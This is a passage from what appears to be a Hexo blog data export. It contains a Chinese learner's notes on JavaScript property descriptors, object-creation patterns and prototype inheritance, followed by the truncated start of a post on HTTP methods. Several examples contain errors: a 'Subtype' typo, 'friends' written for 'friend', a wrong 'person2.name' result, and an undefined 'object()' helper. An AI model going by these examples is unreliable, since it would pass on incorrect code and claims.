class=\"line\">var instance = new SubType();</span><br><span class=\"line\">var instance = new SubType()</span><br><span class=\"line\">instance.getSuperValue()    //true</span><br></pre></td></tr></table></figure><p></p><p>instance的原型连集成了SuperType方法</p><h5 id=\"寄生组合式继承\"><a href=\"#寄生组合式继承\" class=\"headerlink\" title=\"寄生组合式继承\"></a>寄生组合式继承</h5><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">function inheritPrototype(subType, superType)&#123;</span><br><span class=\"line\">    var prototype = object(superType.prototype) // 创建对象</span><br><span class=\"line\">    prototype.constructor = subType             // 增强对象</span><br><span class=\"line\">    subType.prototype = prototype               // 指定对象</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">function SuperType(name)&#123;</span><br><span class=\"line\">    this.name = name;</span><br><span class=\"line\">    this.colors = [&apos;red&apos;,&apos;blue&apos;,&apos;green&apos;]</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">SuperType.prototype.sayName = function()&#123;</span><br><span class=\"line\">    return this.name</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">function SubType(name, age)&#123;</span><br><span class=\"line\">    SuperType.call(this, name)      </span><br><span class=\"line\">    this.age = age</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">inheritPrototype(SubType, SuperType);</span><br><span class=\"line\">SubType.prototype.sayAge = function()&#123;</span><br><span class=\"line\">    return this.age</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure><p>通过上述继承方式，少用了一次构造函数，并且因此避免了在SuperType.prototype上的不必要创建、多余的属性</p><h5 id=\"小结\"><a href=\"#小结\" class=\"headerlink\" title=\"小结\"></a>小结</h5><p>通过本章的学习，深入理解了原型以及原型链上继承的问题。之前没用用过的defineProperty和prototype，都逐渐明白了其用处以及用法。通过原型链，构造函数等学习，让我对JavaScript的理解更上一步。以及对对象的理解更加深刻。不仅仅是属性以及value那么简单。对内存的分配以及效率的使用更加深刻。</p>","site":{"data":{}},"excerpt":"","more":"<h3 id=\"面向对象的程序设计\"><a href=\"#面向对象的程序设计\" class=\"headerlink\" title=\"面向对象的程序设计\"></a>面向对象的程序设计</h3><h4 id=\"属性类型\"><a href=\"#属性类型\" class=\"headerlink\" title=\"属性类型\"></a>属性类型</h4><p>ECMAScript中有两种属性，数据属性和访问器属性</p><h5 id=\"数据属性\"><a href=\"#数据属性\" class=\"headerlink\" title=\"数据属性\"></a>数据属性</h5><p>[[Configurable]] : 表示能否通过 delete 删除属性从而重新定义属性，能否修改属性的特性，或者能否把属性修改为访问器属性。<br>[[Enumerable]] : 表示能否通过 for-in 循环返回属性。<br>[[Writable]] : 表示能否修改属性的值。<br>[[Value]] : 包含这个属性的数据值。读取属性值的时候，从这个位置读；写入属性值时，把新值保存在这个位置。默认值是 undefined。</p><p><em>ps：将Configurable修改为false之后，除了Writable可修改之外，Configurable，Enumerable都不可再修改。</em></p><p><strong>Object.defineProperty可以为对象添加属性</strong></p><h5 id=\"访问器属性\"><a href=\"#访问器属性\" class=\"headerlink\" title=\"访问器属性\"></a>访问器属性</h5><p>[[Configurable]]：表示能否通过 delete 删除属性从而重新定义属性，能否修改属性的特性，或者能否把属性修改为数据属性。<br>[[Enumerable]]：表示能否通过 for-in 循环返回属性。<br>[[Get]]：在读取属性时调用的函数。默认值为 undefined。<br>[[Set]]：在写入属性时调用的函数。默认值为 undefined。</p><p><strong>get,set方法</strong><br>有时候希望访问属性时能返回一个动态计算后的值, 或希望不通过使用明确的方法调用而显示内部变量的状态.在JavaScript中, 能通过使用 getter 实现. 尽管可能结合使用getter和setter创建一个伪属性,但不能既使用getter绑定到一个属性上,同时又用该属性真实的存储一个值.<br></p><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var book = &#123;</span><br><span class=\"line\">    _year : 2004,</span><br><span class=\"line\">    edition : 1</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\">Object.defineProperty(book,&quot;year&quot;,&#123; </span><br><span class=\"line\">    get : function () &#123;</span><br><span class=\"line\">        alert(this._year);</span><br><span class=\"line\">    &#125;,</span><br><span class=\"line\">    set : function (newValue) &#123;</span><br><span class=\"line\">        if (newValue &gt; 2004) &#123;</span><br><span class=\"line\">            this._year = newValue;</span><br><span class=\"line\">            this.edition += newValue - 2004;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;);</span><br><span class=\"line\">book.year;      // 弹出窗口，显示 2004</span><br><span class=\"line\">book.year = 2005;</span><br><span class=\"line\">console.log(book.edition);   // 2</span><br></pre></td></tr></table></figure><p></p><p>get，set方法可以动态的关注对象中变量的变化，可以使其他变量随着变化而变化。因此在某些情况下非常适用<br>定义多个属性Object.defineProperties(obj, props)<br>将defineProperty改为复数形式defineProperties，并将参数改为一个对象<br></p><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var obj = &#123;&#125;;</span><br><span class=\"line\">Object.defineProperties(obj, &#123;</span><br><span class=\"line\">  &quot;property1&quot;: &#123;</span><br><span class=\"line\">    value: true,</span><br><span class=\"line\">    writable: true</span><br><span class=\"line\">  &#125;,</span><br><span class=\"line\">  &quot;property2&quot;: &#123;</span><br><span class=\"line\">    value: &quot;Hello&quot;,</span><br><span class=\"line\">    writable: false</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  // 等等.</span><br><span class=\"line\">&#125;);</span><br><span class=\"line\">console.log(obj); // Object &#123;property1: true, property2: &quot;Hello&quot;&#125;</span><br></pre></td></tr></table></figure><p></p><p>读取给定属性的特性<strong>Object.getOwnPropertyDescriptor(obj, prop)</strong> 返回指定对象上一个自有属性对应的属性描述符。（自有属性指的是直接赋予该对象的属性，不需要从原型链上进行查找的属性）<br></p><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var man = &#123;name: &quot;gdc&quot;&#125;;</span><br><span class=\"line\">console.log(Object.getOwnPropertyDescriptor(man,&quot;name&quot;));</span><br><span class=\"line\">// Object &#123;value: &quot;gdc&quot;, writable: true, enumerable: true, configurable: true&#125;</span><br><span class=\"line\">Object.defineProperties(man,&#123;</span><br><span class=\"line\">  name:&#123;</span><br><span class=\"line\">    writable: false</span><br><span class=\"line\">  &#125;,</span><br><span class=\"line\">  age:&#123;</span><br><span class=\"line\">    writable: true,</span><br><span class=\"line\">    value: 22</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;);</span><br><span class=\"line\">console.log(Object.getOwnPropertyDescriptor(man,&quot;name&quot;));</span><br><span class=\"line\">// Object &#123;value: &quot;gdc&quot;, writable: false, enumerable: true, configurable: true&#125;</span><br><span class=\"line\">console.log(Object.getOwnPropertyDescriptor(man,&quot;age&quot;));</span><br><span class=\"line\">// Object &#123;value: 22, writable: true, enumerable: false, configurable: false&#125;</span><br><span class=\"line\">var descriptor = Object.getOwnPropertyDescriptor(man,&quot;age&quot;);</span><br><span class=\"line\">console.log(descriptor.value);         // 22</span><br><span class=\"line\">console.log(descriptor.configurable);  // false</span><br><span class=\"line\">console.log(descriptor.writable);      // true</span><br><span class=\"line\">console.log(descriptor.get);           // undefined</span><br><span class=\"line\">console.log(descriptor.set);           // undefined</span><br></pre></td></tr></table></figure><p></p><p>读取当前属性，返回获取数据形式</p><h4 id=\"创建对象\"><a href=\"#创建对象\" class=\"headerlink\" title=\"创建对象\"></a>创建对象</h4><h5 id=\"1、工厂模式：\"><a href=\"#1、工厂模式：\" class=\"headerlink\" title=\"1、工厂模式：\"></a>1、工厂模式：</h5><p>为了解决多个类似对象声明的问题，我们可以使用一种叫做 工厂模式的方法，这种方法就是为了解决实例化对象产生大量重复的问题。<br></p><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">function createObject(name,age,profession)&#123;//集中实例化的函数</span><br><span class=\"line\">        var obj = new Object();</span><br><span class=\"line\">        obj.name = name;</span><br><span class=\"line\">        obj.age = age;</span><br><span class=\"line\">        obj.profession = profession;</span><br><span class=\"line\">        obj.move = function () &#123;</span><br><span class=\"line\">            return this.name + &apos; at &apos; + this.age + &apos; engaged in &apos; + this.profession;</span><br><span class=\"line\">        &#125;;</span><br><span class=\"line\">        return obj;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    var test1 = createObject(&apos;trigkit4&apos;,22,&apos;programmer&apos;);//第一个实例</span><br><span class=\"line\">    var test2 = createObject(&apos;mike&apos;,25,&apos;engineer&apos;);//第二个实例</span><br><span class=\"line\">    alert(test1.move());</span><br><span class=\"line\">    alert(test2.move());</span><br></pre></td></tr></table></figure><p></p><p><strong>利:</strong><br>主要好处就是可以消除对象间的耦合，通过使用工程方法而不是new关键字。将所有实例化的代码集中在一个位置防止代码重复</p><p><strong>弊:</strong><br>大多数类最好使用new关键字和构造函数，可以让代码更加简单易读。而不必去查看工厂方法来知道。</p><p><strong>何时使用？</strong><br>1、当对象或组件涉及高复杂性时<br>2、当需要根据所在的不同环境轻松生成对象的不同实例时<br>3、当处理很多共享相同属性的小型对象或组件时</p><h5 id=\"Constructor-构造器-模式\"><a href=\"#Constructor-构造器-模式\" class=\"headerlink\" title=\"Constructor(构造器)模式\"></a>Constructor(构造器)模式</h5><p>ECMAScript 中可以采用构造函数(构造方法)可用来创建特定的对象。 该模式正好可以解决以上的工厂模式无法识别对象实例的问题。<br></p><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">function Car(model,year,miles)&#123;//构造函数模式</span><br><span class=\"line\">    this.model = model;</span><br><span class=\"line\">    this.year = year;</span><br><span class=\"line\">    this.miles = miles;</span><br><span class=\"line\">    this.run = function () &#123;</span><br><span class=\"line\">        return this.model + &quot; has done &quot; + this.miles + &quot;miles&quot;;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">var Benz = new Car(&apos;Benz&apos;,2014,20000);</span><br><span class=\"line\">var BMW = new Car(&quot;BMW&quot;,2013,12000);</span><br><span class=\"line\">alert(Benz instanceof Car); //很清晰的识别他从属于 Car,true</span><br><span class=\"line\">console.log(Benz.run());</span><br><span class=\"line\">console.log(BMW.run());</span><br></pre></td></tr></table></figure><p></p><p><strong>和工厂模式相比：</strong><br>1.构造函数方法没有显示的创建对象 (new Object());<br>2.直接将属性和方法赋值给 this 对象;<br>3.没有 renturn 语句。</p><h5 id=\"原型模式\"><a href=\"#原型模式\" class=\"headerlink\" title=\"原型模式\"></a>原型模式</h5><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">function Person()&#123;&#125;</span><br><span class=\"line\">Person.prototype.name = &quot;gdccwxx&quot;;  </span><br><span class=\"line\">Person.prototype.age =23;  </span><br><span class=\"line\">Person.prototype.sayName = function()&#123;  </span><br><span class=\"line\">    console.log(this.name)  </span><br><span class=\"line\">&#125;;  </span><br><span class=\"line\">var person1 = new Person();  </span><br><span class=\"line\">person1.sayName()     // gdccwxx</span><br><span class=\"line\">var person2 = new Person();</span><br><span class=\"line\">person2.sayName()     // gdccwxx</span><br><span class=\"line\">person1.sayName == person2.sayName  // true</span><br></pre></td></tr></table></figure><p><strong>Person类与构造函数，原型存在如下关系</strong></p><p>Person的原型是person1和person2的原型。而Person.prototype.constructor右指回了Person<br>使用isPrototypeOf()判断对详见是否存在这种关系<br></p><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Person.prototype.isPrototypeOf(person1) // true</span><br><span class=\"line\">Person.prototype.isPrototypeOf(person2) // true</span><br></pre></td></tr></table></figure><p></p><p>虽然对象实例访问保存在原型中的值，却不能通过对象实例重写原型中的值。如果在对象里面添加一个属性，该属性只会存在于对象实例中，而屏蔽原型。即<br></p><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">function Person()&#123;&#125;</span><br><span class=\"line\">Person.prototype.name = &quot;gdccwxx&quot;;  </span><br><span class=\"line\">Person.prototype.age =23;  </span><br><span class=\"line\">Person.prototype.sayName = function()&#123;  </span><br><span class=\"line\">    console.log(this.name)  </span><br><span class=\"line\">&#125;;  </span><br><span class=\"line\">var person1 = new Person();  </span><br><span class=\"line\">person1.sayName()     // gdccwxx</span><br><span class=\"line\">var person2 = new Person();</span><br><span class=\"line\">person2.sayName()     // gdccwxx</span><br><span class=\"line\">person1.name = &apos;guo&apos;</span><br><span class=\"line\">person1.name    // guo</span><br><span class=\"line\">person2.name    // gdccwxx</span><br><span class=\"line\">delete person1.name </span><br><span class=\"line\">person1.name    // gdccwxx</span><br></pre></td></tr></table></figure><p></p><p>对象搜索属性中，先在实例中搜索，实例中有，则直接返回，实例中没有，则到其原型中查找。若在原型中未找到，则返回undefined；若找到则返回。因此，对person1实例添加name属性后，就屏蔽了原型里面的name，删除实例后的属性之后，又去原型里查找。<br><em>ps：原型属性不可被delete掉</em><br>hasOwnProperty()确定属性是否在实例上的方法<br>原型与in操作符<br>in有两种操作，第一种是在for-in循环中使用，另一种是会在通过对象能够访问的给定属性时返回true<br></p><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">function Person()&#123;&#125;</span><br><span class=\"line\">Person.prototype.name = &quot;gdccwxx&quot;;  </span><br><span class=\"line\">Person.prototype.age =23;  </span><br><span class=\"line\">Person.prototype.sayName = function()&#123;  </span><br><span class=\"line\">    console.log(this.name)  </span><br><span class=\"line\">&#125;;  </span><br><span class=\"line\">var person1 = new Person();  </span><br><span class=\"line\">var person2 = new Person();</span><br><span class=\"line\">person1.hasOwnProperty(&apos;name&apos;)  // 在原型上，返回false</span><br><span class=\"line\">&apos;name&apos; in person1       //能够访问，true</span><br><span class=\"line\">person1.name = &apos;guo&apos;</span><br><span class=\"line\">person1.name            // guo</span><br><span class=\"line\">person1.hasOwnProperty(&apos;name&apos;)  // true</span><br><span class=\"line\">&apos;name&apos; in person1       //能够访问，true</span><br><span class=\"line\">person2.name            // guo</span><br><span class=\"line\">person2.hasOwnProperty(&apos;name&apos;)  //false</span><br><span class=\"line\">&apos;name&apos; in person2       // true</span><br><span class=\"line\">delete person1.name</span><br><span class=\"line\">person1.name            // gdccwxx</span><br><span class=\"line\">person1.hasOwnProperty(&apos;name&apos;)  // 在原型上，返回false</span><br><span class=\"line\">&apos;name&apos; in person1       //能够访问，true</span><br></pre></td></tr></table></figure><p></p><p>Object.keys()方法，获取对象所有可枚举实例属性<br></p><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">function Person()&#123;&#125;</span><br><span class=\"line\">Person.prototype.name = &quot;gdccwxx&quot;;  </span><br><span class=\"line\">Person.prototype.age =23;  </span><br><span class=\"line\">Person.prototype.sayName = function()&#123;  </span><br><span class=\"line\">    console.log(this.name)  </span><br><span class=\"line\">&#125;;  </span><br><span class=\"line\">var keys = Object.keys(Person.prototype)</span><br><span class=\"line\">keys            // name,age,sayName</span><br><span class=\"line\">var p1 = new Person();</span><br><span class=\"line\">p1.name = &apos;guo&apos;</span><br><span class=\"line\">p1.age = &apos;20&apos;</span><br><span class=\"line\">var p1keys = Object.keys(p1)</span><br><span class=\"line\">p1keys  // &apos;name,age&apos;</span><br><span class=\"line\">// 获得所有实例属性，无论是否可枚举，使用Object.getOwnPropertyNames()</span><br><span class=\"line\">var keys = Object.getOwnPropertyNames(Person.prototype)</span><br><span class=\"line\">keys    // [&quot;constructor&quot;, &quot;name&quot;, &quot;age&quot;, &quot;sayName&quot;]</span><br><span class=\"line\">// 也可以使用另一种原型定义方法，字面量方法</span><br><span class=\"line\">function Person()&#123;&#125;</span><br><span class=\"line\">Person.prototype = &#123;</span><br><span class=\"line\">    name : &apos;gdccwxx&apos;,</span><br><span class=\"line\">    age : 20,</span><br><span class=\"line\">    sayName: function()&#123;</span><br><span class=\"line\">        //</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">//如果constructor很重要，也可以特意设定</span><br><span class=\"line\">Person.prototype = &#123;</span><br><span class=\"line\">    constructor: Person,</span><br><span class=\"line\">    name : &apos;gdccwxx&apos;,</span><br><span class=\"line\">    age : 20,</span><br><span class=\"line\">    sayName: function()&#123;</span><br><span class=\"line\">        //</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">//这种重设constructor会导致其Enumerable属性变为true。如果要重设，应使用defineProperty</span><br><span class=\"line\">Object.defineProperty(Person.prototype, &apos;constructor&apos;,&#123;</span><br><span class=\"line\">    enumerable: false,</span><br><span class=\"line\">    value: Person</span><br><span class=\"line\">&#125;)</span><br></pre></td></tr></table></figure><p></p><p>由于是person指针指向Person的prototype，因此在Person任意改变prototype的情况下，会导致所有子元素都改变。因此大多都很少单独使用原型模式<br><strong>组合使用构造函数模式和原型模式</strong><br>将函数使用prototype模式，其他基本类型使用构造函数.可以达到节省内存，又拥有实例和副本。<br></p><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">function Person(name,age,job)&#123;</span><br><span class=\"line\">    this.name = name;</span><br><span class=\"line\">    this.age = age;</span><br><span class=\"line\">    this.job = job;</span><br><span class=\"line\">    this.friend = [&apos;a&apos;,&apos;b&apos;]</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">Person.prototype = &#123;</span><br><span class=\"line\">    constructor: Person,</span><br><span class=\"line\">    sayName : function()&#123;</span><br><span class=\"line\">        console.log(this.name)</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">var person1 = new Person(&apos;gdccwxx&apos;, 20 ,&apos;SoftWare&apos;)</span><br><span class=\"line\">var person2 = new Person(&apos;guo&apos;, 10 ,&apos;Doctor&apos;)</span><br><span class=\"line\">person1.friends.push(&apos;van&apos;)</span><br><span class=\"line\">person1.friend      // a,b,van</span><br><span class=\"line\">person2.friend      // a,b</span><br><span class=\"line\">person1.friend === person2.friend   //false</span><br><span class=\"line\">person1.sayName === person2.sayName   //true</span><br></pre></td></tr></table></figure><p></p><h4 id=\"继承\"><a href=\"#继承\" class=\"headerlink\" title=\"继承\"></a>继承</h4><h5 id=\"原型链\"><a href=\"#原型链\" class=\"headerlink\" title=\"原型链\"></a>原型链</h5><p>原型链是JavaScript的主要实现继承方法<br></p><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">function SuperType()&#123;</span><br><span class=\"line\">    this.property = true</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">SuperType.prototype.getSuperValue = function()&#123;</span><br><span class=\"line\">    return this.property;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">function SubType()&#123;</span><br><span class=\"line\">    this.subproperty = false</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">Subtype.prototype = new SuperType()</span><br><span class=\"line\">SubType.prototype.getSubValue = function()&#123;</span><br><span class=\"line\">    return this.subproperty;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">var instance = new SubType();</span><br><span class=\"line\">var instance = new SubType()</span><br><span class=\"line\">instance.getSuperValue()    //true</span><br></pre></td></tr></table></figure><p></p><p>instance的原型连集成了SuperType方法</p><h5 id=\"寄生组合式继承\"><a href=\"#寄生组合式继承\" class=\"headerlink\" title=\"寄生组合式继承\"></a>寄生组合式继承</h5><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">function inheritPrototype(subType, superType)&#123;</span><br><span class=\"line\">    var prototype = object(superType.prototype) // 创建对象</span><br><span class=\"line\">    prototype.constructor = subType             // 增强对象</span><br><span class=\"line\">    subType.prototype = prototype               // 指定对象</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">function SuperType(name)&#123;</span><br><span class=\"line\">    this.name = name;</span><br><span class=\"line\">    this.colors = [&apos;red&apos;,&apos;blue&apos;,&apos;green&apos;]</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">SuperType.prototype.sayName = function()&#123;</span><br><span class=\"line\">    return this.name</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">function SubType(name, age)&#123;</span><br><span class=\"line\">    SuperType.call(this, name)      </span><br><span class=\"line\">    this.age = age</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">inheritPrototype(SubType, SuperType);</span><br><span class=\"line\">SubType.prototype.sayAge = function()&#123;</span><br><span class=\"line\">    return this.age</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure><p>通过上述继承方式，少用了一次构造函数，并且因此避免了在SuperType.prototype上的不必要创建、多余的属性</p><h5 id=\"小结\"><a href=\"#小结\" class=\"headerlink\" title=\"小结\"></a>小结</h5><p>通过本章的学习，深入理解了原型以及原型链上继承的问题。之前没用用过的defineProperty和prototype，都逐渐明白了其用处以及用法。通过原型链，构造函数等学习，让我对JavaScript的理解更上一步。以及对对象的理解更加深刻。不仅仅是属性以及value那么简单。对内存的分配以及效率的使用更加深刻。</p>"},{"title":"初识http","date":"2017-08-01T08:05:59.000Z","dir":"http","keywords":"http","_content":"#### 初识http\n在刚刚开始学习前端ajax时，经常听说http协议，“不就是三次握手，四次挥手吗？”，一番言语过后。似懂非懂。近期由于开始学习nodejs，借此机会开始学习了一波http\n#### 什么是http?\n从其英文全意来看，是HyperText Transfer Protocol，中文解释是超文本传输协议。那什么又是超文本？。在wiki上解释是：\n\n`超文本（英语：Hypertext）是一种在电脑显示器或其他电子设备，用以显示文本及与文本相关的内容，其中的文字包含有可以链接到其他字段或者文档的超链接，允许从当前阅读位置直接切换到超链接所指向的文字。万维网的架构便是以超文本的底层概念定义为基础。`\n\n因此，从概念上来看，http最初的目的就是为了提供一种发布和接收HTML页面的方法。\n\n#### http包含了那些方法？\nHTTP/1.1协议中共定义了八种方法（也叫“动作”）来以不同方式操作指定的资源：\n##### GET\n向指定的资源发出“显示”请求。使用GET方法应该只用在读取数据，而不应当被用于产生“副作用”的操作中，例如在Web Application中。其中一个原因是GET可能会被网络蜘蛛等随意访问。参见安全方法\n\n##### HEAD\n与GET方法一样，都是向服务器发出指定资源的请求。只不过服务器将不传回资源的本文部分。它的好处在于，使用这个方法可以在不必传输全部内容的情况下，就可以获取其中“关于该资源的信息”（元信息或称元数据）。\n\n##### POST\n向指定资源提交数据，请求服务器进行处理（例如提交表单或者上传文件）。数据被包含在请求本文中。这个请求可能会创建新的资源或修改现有资源，或二者皆有。\n\n##### PUT\n向指定资源位置上传其最新内容。\n\n##### DELETE\n请求服务器删除Request-URI所标识的资源。\n\n##### TRACE\n回显服务器收到的请求，主要用于测试或诊断。\n\n##### 